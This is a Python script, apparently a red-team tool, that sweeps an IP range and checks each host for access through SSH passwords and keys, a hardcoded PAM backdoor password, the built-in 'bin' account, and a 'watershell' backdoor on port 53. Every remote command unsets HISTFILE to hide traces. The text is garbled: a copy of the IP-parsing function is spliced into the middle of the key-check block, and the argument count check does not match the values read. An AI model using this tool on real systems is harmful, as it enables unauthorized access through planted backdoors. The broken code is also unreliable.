# Quick script to check which methods can be used to access a box

import sys
import shlex
import subprocess
from concurrent.futures import ThreadPoolExecutor, as_completed

def parse_ip_range(ip_range):
    # Split IP into four octets
    parts = ip_range.split('.')
    if len(parts) != 4:
        raise SystemExit("Invalid IP range format")

    def expand(part):
        # supports 1, 1-3, 1,2,3-5 etc.
        vals = []
        for section in part.split(','):
            if '-' in section:
                s, e = map(int, section.split('-'))
                vals.extend(range(s, e + 1))
            else:
                vals.append(int(section))
        return vals

    expanded = [expand(p) for p in parts]
    return [f"{a}.{b}.{c}.{d}" for a in expanded[0] for b in expanded[1] for c in expanded[2] for d in expanded[3]]

def check_access(ip, username, password, builtin_user_password):
    # Method 1: SSH via password
    print(f"[i] Checking {ip} for SSH password")
    argv = [
        "sshpass", "-p", password,
        "ssh",
        "-o", "StrictHostKeyChecking=no",
        "-o", "PubkeyAuthentication=no",
        "-o", "BatchMode=no",
        f"{username}@{ip}",
        "unset", "HISTFILE", "&&", "echo", "1"
    ]
    try:
        proc = subprocess.run(argv, capture_output=True, text=True, timeout=5)
        out = proc.stdout.strip()
        err = proc.stderr.strip()
        status = proc.returncode
        if out == '1':
            print(f"    [+] Access to {ip} confirmed via SSH password")
            return
    except subprocess.TimeoutExpired:
        print("[-] SSH via password timeout after 5s")
    except Exception as e:
        print("[-] SSH via password error:", e)

    # Method 2: SSH via key
    print(f"[i] Checking {ip} for SSH key")
    argv = [
        "ssh", f"{username}@{ip}", "-i", "~/.ssh/id_ed25519", "unset", "HISTFILE", "&&", "echo", "1"
    ]
    try:
        proc = subprocess.run(argv, capture_output=True, text=True, timeout=5)
        out = proc.stdout.strip()def parse_ip_range(ip_range):
    # Split IP into four octets
    parts = ip_range.split('.')
    if len(parts) != 4:
        raise SystemExit("Invalid IP range format")

    def expand(part):
        # supports 1, 1-3, 1,2,3-5 etc.
        vals = []
        for section in part.split(','):
            if '-' in section:
                s, e = map(int, section.split('-'))
                vals.extend(range(s, e + 1))
            else:
                vals.append(int(section))
        return vals

    expanded = [expand(p) for p in parts]
    return [f"{a}.{b}.{c}.{d}" for a in expanded[0] for b in expanded[1] for c in expanded[2] for d in expanded[3]]
        err = proc.stderr.strip()
        status = proc.returncode
        if out == '1':
            print(f"    [+] Access to {ip} confirmed via SSH key")
            return
    except subprocess.TimeoutExpired:
        print("[-] SSH via key timeout after 5s")
    except Exception as e:
        print("[-] SSH via key error:", e)

    # Method 3: SSH via PAM backdoor password
    print(f"[i] Checking {ip} for SSH backdoor password")
    argv = [
        "sshpass", "-p", "ioctl_pass",
        "ssh",
        "-o", "PubkeyAuthentication=no",
        "-o", "StrictHostKeyChecking=no",
        "-o", "BatchMode=no",
        f"{username}@{ip}",
        "unset", "HISTFILE", "&&", "echo", "1"
    ]
    try:
        proc = subprocess.run(argv, capture_output=True, text=True, timeout=5)
        out = proc.stdout.strip()
        err = proc.stderr.strip()
        status = proc.returncode
        if out == '1':
            print(f"    [+] Access to {ip} confirmed via SSH backdor password")
            return
    except subprocess.TimeoutExpired:
        print("[-] SSH via backdoor password timeout after 5s")
    except Exception as e:
        print("[-] SSH via backdoor password error:", e)

    # Method 4: SSH via built-in user
    print(f"[i] Checking {ip} for built-in user")
    argv = [
        "sshpass", "-p", f"{builtin_user_password}",
        "ssh",
        "-o", "PubkeyAuthentication=no",
        "-o", "StrictHostKeyChecking=no",
        "-o", "BatchMode=no",
        f"bin@{ip}",
        "unset", "HISTFILE", "&&", "echo", "1"
    ]
    try:
        proc = subprocess.run(argv, capture_output=True, text=True, timeout=5)
        out = proc.stdout.strip()
        err = proc.stderr.strip()
        status = proc.returncode
        if out == '1':
            print(f"    [+] Access to {ip} confirmed via SSH backdor password")
            return
    except subprocess.TimeoutExpired:
        print("[-] SSH via backdoor password timeout after 5s")
    except Exception as e:
        print("[-] SSH via backdoor password error:", e)


    # Method 5: Watershell
    # python3 watershell-cli.py -t 192.168.204.131 -p 53 -c id
    print(f"[i] Checking {ip} for watershell")
    argv = [
        "python3", "watershell-cli.py", "-t", f"{ip}", "-p", "53"
    ]
    try:
        proc = subprocess.run(argv, capture_output=True, text=True, timeout=10)
        out = proc.stdout.strip()
        err = proc.stderr.strip()
        status = proc.returncode
        if "Connected" in out:
            print(f"    [+] Access to {ip} confirmed via watershell")
            return
    except subprocess.TimeoutExpired:
        print("[-] Watershell timeout after 5s")
    except Exception as e:
        print("[-] Watershell error:", e)

    
    
def main():
    if len(sys.argv) != 4:
        print("Usage: python3 check_boxes_for_access.py <ip_range> <username> <password> <builtin_user_password>")
        raise SystemExit(1)
    ip_range, username, password, builtin_user_password = sys.argv[1:5]
    ips = parse_ip_range(ip_range)
    print("[i] Checking the following IPs:", ips)

    for ip in ips:
        check_access(ip, username, password, builtin_user_password)

if __name__ == "__main__":
    main()
